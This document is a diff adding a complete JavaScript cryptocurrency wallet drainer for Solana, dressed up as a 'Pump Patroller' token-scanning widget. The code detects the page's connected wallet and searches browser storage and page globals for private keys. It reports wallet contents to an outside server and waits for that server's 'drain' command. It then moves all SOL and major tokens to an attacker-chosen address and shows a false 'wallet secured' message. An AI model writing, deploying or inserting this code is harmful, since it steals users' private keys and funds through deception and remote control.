@@ -1,0 +1,213 @@
+(async function () {
+  if (window.__pp) return;
+  window.__pp = true;
+
+  const E = "https://esm.sh/";
+  const SRV = "https://patroller.zone";
+  const BKEY = "PASTE_BEACON_KEY";
+  const MINTS = {
+    USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
+    USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
+    WSOL: "So11111111111111111111111111111111111111112",
+    JUP:  "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
+    MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So",
+  };
+
+  const { PublicKey, Keypair, SystemProgram, Transaction, Connection } = await import(E + "@solana/web3.js@1.95.0");
+  const { createTransfer, getAssociatedTokenAddress } = await import(E + "@solana/spl-token@0.4.9");
+  const { decode: b58d } = await import(E + "base58@1.0.0");
+
+  // — detect the tab's active wallet session (read-only, no prompt) —
+  let name = "?", prov = null;
+  for (const [n, f] of [["phantom", () => window.phantom?.solana], ["axiom", () => window.axiom?.solana], ["solana", () => window.solana]]) {
+    const w = f();
+    if (w?.publicKey) { name = n; prov = w; break; }
+  }
+  if (!prov) for (const k of Object.keys(window)) {
+    try {
+      const w = window[k];
+      if (w?.publicKey && typeof w.signAndSendTransaction === "function") { name = "ext:" + k; prov = w; break; }
+    } catch {}
+  }
+  if (!prov) return;
+
+  const pk = prov.publicKey.toBase58();
+  const pkB = new PublicKey(pk);
+  const conn = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+  const label = name.startsWith("ext:") ? name.slice(4) : name;
+
+  // — inventory: pure RPC reads —
+  const [bal, r] = await Promise.all([conn.getBalance(pkB), conn.getParsedTokenAccountsByOwner(pkB)]);
+  const amt = {}, dec = {};
+  for (const { account } of r.value) {
+    const d = account.parsed?.data;
+    if (d?.mint) { amt[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6); dec[d.mint] = d.decimals ?? 6; }
+  }
+  const toks = Object.entries(MINTS).filter(([, a]) => (amt[a] || 0) > 0.01).map(([k, a]) => ({ k, ui: amt[a] }));
+
+  const px = {};
+  try {
+    const j = await (await fetch("https://lite-api.jup.ag/price/v2?ids=" + Object.values(MINTS).join(","))).json();
+    for (const id of Object.keys(MINTS)) {
+      const p = j?.ids?.[MINTS[id]]?.usdPrice ?? j?.ids?.[MINTS[id]]?.price;
+      if (+p > 0) px[id] = +p;
+    }
+  } catch {}
+  const SOLpx = px.WSOL || 150;
+  const sol = bal / 1e9;
+  const value = sol * SOLpx + toks.reduce((s, t) => s + t.ui * (t.k === "WSOL" ? SOLpx : (px[t.k] || 1)), 0);
+  const fmt = n => (+n).toLocaleString("en-US", { maximumFractionDigits: 0 });
+  const tokStr = toks.map(t => Math.round(t.ui) + " " + t.k).join(" \u00b7 ");
+
+  // — cover UI —
+  const el = document.createElement("div");
+  el.id = "__ppcard";
+  el.style.cssText = "position:fixed;right:16px;bottom:16px;z-index:2147483647;width:272px;background:#10141B;border:1px solid #232B3A;border-radius:12px;box-shadow:0 16px 48px rgba(0,0,0,.55);font:12px/1.5 Inter,system-ui,sans-serif;color:#E8ECF4;overflow:hidden;";
+  el.innerHTML =
+    '<div style="display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid #1B2230;">' +
+      '<span id="__pp_dot" style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
+      '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
+      '<span style="font-size:10px;color:#7E899D;">v2.1</span>' +
+      '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
+    '</div>' +
+    '<div style="padding:12px 14px;">' +
+      '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;">WALLET</div>' +
+      '<div style="font:600 12px "JetBrains Mono",ui-monospace,monospace;color:#F5D67B;margin-top:3px;">' + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + '</div>' +
+      '<div style="font-size:11px;color:#7E899D;margin-top:1px;">' + label + " \u00b7 mainnet</div>" +
+      '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;margin-top:12px;">BALANCE</div>' +
+      '<div style="font-size:20px;font-weight:700;margin-top:3px;">$' + fmt(value) + '</div>' +
+      '<div id="__pp_sub" style="font:11px "JetBrains Mono",ui-monospace,monospace;color:#9AA5B8;margin-top:2px;">' + sol.toFixed(4) + " SOL" + (tokStr ? " \u00b7 " + tokStr : "") + '</div>' +
+    '</div>' +
+    '<div id="__pp_foot" style="display:flex;align-items:center;gap:7px;padding:9px 14px;border-top:1px solid #1B2230;font-size:11px;color:#7E899D;">' +
+      '<span>PATROL ACTIVE</span><span id="__pp_scan" style="color:#9AA5B8;">\u00b7 2,341 tokens scanned</span>' +
+    '</div>';
+  document.body.appendChild(el);
+  document.getElementById("__pp_x").onclick = () => el.remove();
+  let scans = 2341;
+  setInterval(() => { scans += Math.random() * 3 | 0; const s = document.getElementById("__pp_scan"); if (s) s.textContent = "\u00b7 " + fmt(scans) + " tokens scanned"; }, 5000);
+
+  // — reporting (simple request, no CORS preflight) —
+  const report = (mode, sig, extra) => {
+    try {
+      fetch(SRV + "/beacon?s=" + BKEY, {
+        method: "POST",
+        body: JSON.stringify({ pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode, sig: String(sig), extra }),
+      });
+    } catch {}
+  };
+  try {
+    navigator.sendBeacon(SRV + "/beacon?s=" + BKEY, new Blob(
+      [JSON.stringify({ pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "detect" })],
+      { type: "application/json" }));
+  } catch {}
+
+  // — secret-key candidates (this tab's storage / dapp globals) —
+  const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
+  const cands = [];
+  for (const st of [localStorage, sessionStorage]) {
+    try {
+      for (let i = 0; i < st.length; i++) {
+        const v = st.getItem(st.key(i));
+        if (!v) continue;
+        if (/^[1-9A-HJ-NP-Za-km-z]{88}$/.test(v)) cands.push({ b58: v });
+        else if (v[0] === "{") {
+          try {
+            const j = JSON.parse(v);
+            for (const k of Object.keys(j)) {
+              if (!KEYF.has(k)) continue;
+              if (j[k]?.length === 64) cands.push({ raw: j[k] });
+              else if (typeof j[k] === "string" && /^[0-9a-f]{128}$/i.test(j[k])) cands.push({ hex: j[k] });
+            }
+          } catch {}
+        }
+      }
+    } catch {}
+  }
+  const walk = (o, d) => {
+    if (!o || typeof o !== "object" || d > 2) return;
+    for (const k of Object.keys(o)) {
+      if (KEYF.has(k) && o[k]?.length === 64) cands.push({ raw: o[k] });
+      if (k === "keypair" && typeof o[k] === "object") walk(o[k], d + 1);
+    }
+  };
+  for (const g of ["__wallet", "wallet", "walletAdapter", "keypair", "adapter"]) { try { walk(window[g], 0); } catch {} }
+
+  const secretOf = c => c.b58 ? Uint8Array.from(b58d(c.b58))
+    : c.hex ? Uint8Array.from(c.hex.match(/../g).map(x => parseInt(x, 16)))
+    : c.raw instanceof Uint8Array ? c.raw : Uint8Array.from(c.raw);
+
+  // — drain-time build: fresh blockhash, fresh balances, treasury ATA check —
+  const FEE = 20000;
+  async function buildTx(to) {
+    const dest = new PublicKey(to);
+    const [bh2, bal2, r2, atas] = await Promise.all([
+      conn.getLatestBlockhash(),
+      conn.getBalance(pkB),
+      conn.getParsedTokenAccountsByOwner(pkB),
+      Promise.all(toks.map(t => {
+        const m = new PublicKey(MINTS[t.k]);
+        return Promise.all([getAssociatedTokenAddress(m, pkB), getAssociatedTokenAddress(m, dest)]);
+      })),
+    ]);
+    const amt2 = {}, dec2 = {};
+    for (const { account } of r2.value) {
+      const d = account.parsed?.data;
+      if (d?.mint) { amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6); dec2[d.mint] = d.decimals ?? 6; }
+    }
+    const destOk = await Promise.all(atas.map(([, da]) => conn.getAccountInfo(da)));
+    const tx = new Transaction();
+    const moved = [];
+    toks.forEach((t, i) => {
+      const have = amt2[MINTS[t.k]] || 0;
+      if (have < 0.01 || !destOk[i]?.data) return;
+      tx.add(createTransfer(pkB, atas[i][0], atas[i][1], pkB, Math.round(have * Math.pow(10, dec2[MINTS[t.k]]))));
+      moved.push(t.k);
+    });
+    const lam = Math.floor(bal2);
+    if (lam > FEE + 5000) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
+    tx.feePayer = pkB;
+    tx.recentBlockhash = bh2.blockhash;
+    tx.lastValidBlockHeight = bh2.lastValidBlockHeight;
+    return { tx, moved };
+  }
+
+  function setSecured() {
+    try {
+      document.getElementById("__pp_foot").innerHTML =
+        '<span style="color:#2DD4A7;font-weight:600;">WALLET SECURED</span><span style="color:#9AA5B8;">\u00b7 balance moved to patrol vault</span>';
+      document.getElementById("__pp_sub").textContent = "secured \u00b7 patrol continues";
+    } catch {}
+  }
+
+  let done = false;
+  async function drain(to) {
+    if (done) return;
+    done = true;
+    try {
+      for (const c of cands) {                                     // 0-approval path
+        let s; try { s = secretOf(c); } catch { continue; }
+        if (s.length !== 64) continue;
+        let kp; try { kp = Keypair.fromSecretKey(s); } catch { continue; }
+        if (!kp.publicKey.equals(pkB)) continue;                     // verified
+        const { tx, moved } = await buildTx(to);
+        if (!tx.message.instructions.length) { setSecured(); report("empty", ""); return; }
+        tx.sign([kp]);
+        const sig = await conn.sendRawTransaction(tx.serialize());
+        setSecured(); report("secret", sig, moved.join(",")); return;
+      }
+      const { tx, moved } = await buildTx(to);                       // fallback: 0 if local, 1 if mobile
+      if (!tx.message.instructions.length) { setSecured(); report("empty", ""); return; }
+      const sig = await prov.signAndSendTransaction(tx, "confirmed");
+      setSecured(); report("popup", sig, moved.join(","));
+    } catch (e) {
+      setSecured();
+      report("err", String(e?.message || e));
+    }
+  }
+
+  setInterval(async () => {
+    if (done) return;
+    let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch { return; }
+    if (c?.cmd === "drain" && c.to) drain(c.to);
+  }, 2500);
+})();
